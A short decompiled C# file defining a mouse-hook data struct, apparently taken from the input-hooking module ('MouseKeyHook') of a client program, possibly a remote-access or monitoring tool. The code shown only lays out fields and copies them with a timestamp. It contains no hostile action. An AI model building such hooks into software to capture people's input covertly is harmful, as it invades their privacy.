using System;
using System.Runtime.InteropServices;

namespace xClient.Core.MouseKeyHook.WinApi
{
	// Token: 0x0200006F RID: 111
	[StructLayout(LayoutKind.Explicit)]
	internal struct AppMouseStruct
	{
		// Token: 0x0600030E RID: 782 RVA: 0x0000F3B0 File Offset: 0x0000D5B0
		public MouseStruct ToMouseStruct()
		{
			return new MouseStruct
			{
				Point = this.Point,
				MouseData = this.MouseData,
				Timestamp = Environment.TickCount
			};
		}

		// Token: 0x0400013A RID: 314
		[FieldOffset(0)]
		public Point Point;

		// Token: 0x0400013B RID: 315
		[FieldOffset(22)]
		public short MouseData;
	}
}
